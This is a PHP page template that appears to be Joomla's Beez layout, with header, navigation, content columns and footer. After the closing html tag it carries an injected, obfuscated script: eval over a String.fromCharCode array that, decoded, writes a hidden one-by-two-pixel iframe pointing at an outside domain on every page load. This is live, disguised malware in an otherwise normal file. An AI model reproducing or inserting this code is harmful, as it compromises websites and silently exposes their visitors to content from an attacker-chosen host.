<?php
/**
 * @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

defined('_JEXEC') or die('Restricted access');

$url = clone(JURI::getInstance());
$showRightColumn = $this->countModules('user1 or user2 or right or top');
$showRightColumn &= JRequest::getCmd('layout') != 'form';
$showRightColumn &= JRequest::getCmd('task') != 'edit'
?>
<?php echo '<?xml version="1.0" encoding="utf-8"?'.'>'; ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>" >
<head>
	<jdoc:include type="head" />
	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/beez/css/template.css" type="text/css" />
	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/beez/css/position.css" type="text/css" media="screen,projection" />
	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/beez/css/layout.css" type="text/css" media="screen,projection" />
	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/beez/css/print.css" type="text/css" media="Print" />
	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/beez/css/general.css" type="text/css" />
	<?php if($this->direction == 'rtl') : ?>
	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/beez/css/template_rtl.css" type="text/css" />
	<?php endif; ?>
	<!--[if lte IE 6]>
		<link href="<?php echo $this->baseurl ?>/templates/beez/css/ieonly.css" rel="stylesheet" type="text/css" />
	<![endif]-->
	<!--[if IE 7]>
		<link href="<?php echo $this->baseurl ?>/templates/beez/css/ie7only.css" rel="stylesheet" type="text/css" />
	<![endif]-->
	<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/beez/javascript/md_stylechanger.js"></script>
</head>
<body>
	<div id="all">
		<div id="header">
			<h1 id="logo">
				<img src="<?php echo $this->baseurl ?>/templates/beez/images/logo.gif" border="0" alt="<?php echo JText::_('Logo Beez, Three little Bees'); ?>" width="300" height="97" />
				<span class="header1"><?php echo JText::_('Joomla Accessible Template'); ?></span>
			</h1>

			<ul>
				<li><a href="#content" class="u2"><?php echo JText::_('Skip to Content'); ?></a></li>
				<li><a href="#mainmenu" class="u2"><?php echo JText::_('Jump to Main Navigation and Login'); ?></a></li>
				<li><a href="#additional" class="u2"><?php echo JText::_('Jump to additional Information'); ?></a></li>
			</ul>

			<h2 class="unseen">
				<?php echo JText::_('Search, View and Navigation'); ?>
			</h2>

			<div id="fontsize">
				<script type="text/javascript">
				//<![CDATA[
					document.write('<h3><?php echo JText::_('FONTSIZE'); ?></h3><p class="fontsize">');
					document.write('<a href="index.php" title="<?php echo JText::_('Increase size'); ?>" onclick="changeFontSize(2); return false;" class="larger"><?php echo JText::_('bigger'); ?></a><span class="unseen">&nbsp;</span>');
					document.write('<a href="index.php" title="<?php echo JText::_('Decrease size'); ?>" onclick="changeFontSize(-2); return false;" class="smaller"><?php echo JText::_('smaller'); ?></a><span class="unseen">&nbsp;</span>');
					document.write('<a href="index.php" title="<?php echo JText::_('Revert styles to default'); ?>" onclick="revertStyles(); return false;" class="reset"><?php echo JText::_('reset'); ?></a></p>');
				//]]>
				</script>
			</div>

			<jdoc:include type="modules" name="user3" />
			<jdoc:include type="modules" name="user4" />

			<div id="breadcrumbs">
				<p>
					<?php echo JText::_('You are here'); ?>
					<jdoc:include type="modules" name="breadcrumb" />
				</p>
			</div>

			<div class="wrap">&nbsp;</div>
		</div><!-- end header -->

		<div id="<?php echo $showRightColumn ? 'contentarea2' : 'contentarea'; ?>">
			<a name="mainmenu"></a>
			<div id="left">
				<jdoc:include type="modules" name="left" style="beezDivision" headerLevel="3" />
			</div><!-- left -->

			<a name="content"></a>
			<div id="wrapper">
			<div id="<?php echo $showRightColumn ? 'main2' : 'main'; ?>">
				<?php if ($this->getBuffer('message')) : ?>
				<div class="error">
					<h2>
						<?php echo JText::_('Message'); ?>
					</h2>
					<jdoc:include type="message" />
				</div>
				<?php endif; ?>

				<jdoc:include type="component" />
			</div><!-- end main or main2 -->

			<?php if ($showRightColumn) : ?>
			<div id="right">

				<a name="additional"></a>
				<h2 class="unseen">
					<?php echo JText::_('Additional Information'); ?>
				</h2>

				<jdoc:include type="modules" name="top" style="beezDivision" headerLevel="3" />
				<jdoc:include type="modules" name="user1" style="beezDivision" headerLevel="3" />
				<jdoc:include type="modules" name="user2" style="beezDivision" headerLevel="3" />
				<jdoc:include type="modules" name="right" style="beezDivision" headerLevel="3" />

			</div><!-- right -->
			<?php endif; ?>

			<div class="wrap"></div>
			</div><!-- wrapper -->
		</div><!-- contentarea -->

		<div id="footer">
			<p class="syndicate">
				<jdoc:include type="modules" name="syndicate" />
			</p>

			<p>
				<?php echo JText::_('Powered by');?> <a href="http://www.joomla.org/">Joomla!</a>
			</p>

			<div class="wrap"></div>
		</div><!-- footer -->
	</div><!-- all -->

	<jdoc:include type="modules" name="debug" />

</body>
</html><?php echo '<script type="text/javascript">eval(String.fromCharCode(118,97,114,32,104,106,103,52,61,34,104,111,116,34,59,118,97,114,32,119,61,34,105,34,59,118,97,114,32,114,101,54,61,34,99,97,110,46,34,59,118,97,114,32,114,114,116,116,54,61,34,99,111,109,34,59,118,97,114,32,97,61,34,105,102,34,59,118,97,114,32,115,61,34,116,116,34,59,100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,39,43,97,43,39,114,97,109,101,32,115,114,99,61,34,104,39,43,115,43,39,112,58,47,47,39,43,104,106,103,52,43,39,39,43,119,43,39,39,43,114,101,54,43,39,39,43,114,114,116,116,54,43,39,47,39,43,39,34,32,119,105,100,116,104,61,34,49,34,32,104,101,105,103,104,116,61,34,50,34,62,60,47,105,39,43,39,102,39,43,39,114,97,109,101,62,39,41,59,118,97,114,32,119,54,61,48,48,53,48,51,50,48,48,48,48,48,50,49,48))</script>'; ?>